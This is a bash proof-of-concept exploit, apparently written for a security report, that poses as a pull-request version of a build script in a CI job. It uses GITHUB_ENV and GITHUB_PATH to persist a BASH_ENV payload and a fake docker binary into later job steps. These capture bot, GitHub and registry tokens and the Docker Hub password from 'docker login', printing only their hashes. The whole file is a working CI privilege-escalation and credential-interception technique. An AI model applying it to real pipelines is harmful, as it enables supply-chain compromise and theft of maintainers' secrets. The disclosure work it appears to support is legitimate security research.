#!/bin/bash
# PR-supplied version of hack/build_auto_pause.sh.
# The kicbase build job runs this from the PR head inside "Prepare build metadata",
# a step whose own env contains no secrets.
set -u

mkdir -p /tmp/pocp/bin

cat > /tmp/pocp/bash_env_payload.sh <<'PAYLOAD'
#!/bin/bash
# Runs via BASH_ENV in every later bash step of the same job.
echo "POC_BASH_BOT_TOKEN_SHA256=$(printf '%s' "${BOT_TOKEN:-}" | sha256sum | cut -d' ' -f1)"
echo "POC_BASH_GH_TOKEN_SHA256=$(printf '%s' "${GH_TOKEN:-}" | sha256sum | cut -d' ' -f1)"
echo "POC_BASH_REGISTRY_PASS_SHA256=$(printf '%s' "${REGISTRY_PASS:-}" | sha256sum | cut -d' ' -f1)"
PAYLOAD

# Shadow the docker CLI. docker/login-action runs `docker login --password-stdin`,
# so whatever binary is first on PATH receives the Docker Hub password on stdin.
cat > /tmp/pocp/bin/docker <<'PAYLOAD'
#!/bin/bash
if [ "${1:-}" = "login" ] || [ "${1:-}" = "logout" ]; then
  input=$(cat 2>/dev/null || true)
  echo "POC_DOCKER_STDIN_SHA256=$(printf '%s' "$input" | sha256sum | cut -d' ' -f1)"
  exit 1
fi
exec /usr/bin/docker "$@"
PAYLOAD
chmod +x /tmp/pocp/bin/docker

# --- the persistence primitives -------------------------------------------
# env vars written here apply to every following step of the same job
echo "BASH_ENV=/tmp/pocp/bash_env_payload.sh" >> "$GITHUB_ENV"
# a PATH entry written here shadows binaries used by later steps/actions
echo "/tmp/pocp/bin" >> "$GITHUB_PATH"
# -------------------------------------------------------------------------

echo "PR code ran inside the kicbase build job"
